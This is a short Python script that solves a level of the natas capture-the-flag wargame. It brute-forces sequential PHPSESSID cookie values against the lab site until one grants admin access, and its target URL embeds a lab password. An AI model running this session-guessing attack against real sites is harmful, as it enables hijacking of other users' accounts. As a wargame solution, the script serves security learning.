
# Created by Joao Godinho
#       October 2014
# Script to brute force level 18 of natas wargames
# Refer to http://floatingbytes.blogspot.com for details

# Library to work with the POST requests
import requests

# Our target URL
target = 'http://natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs@natas19.natas.labs.overthewire.org/'
# The magic words that tell's we got it
acceptStr = str.encode('You are an admin.')

# Checking if we can connect to the target, just in case...
r = requests.get(target)
if r.status_code != requests.codes.ok:
        raise ValueError('Kabum? Couldn\'t connect to target :(')
else:
        print ('Target reachable. Starting session brute force...')

# Iterate each session and check if there's one with admin access
for i in range(1,641):
        if i % 10 == 0:
                print ('Checked '+str(i)+' sessions...')
        cookies = dict(PHPSESSID=str(i))
        r = requests.get(target, cookies=cookies)
        # Did we find the right session?
        if r.content.find(acceptStr) != -1:
                print ('Got it! Session='+str(i))
                print (r.content)
                break
print ('Done. Have fun!')
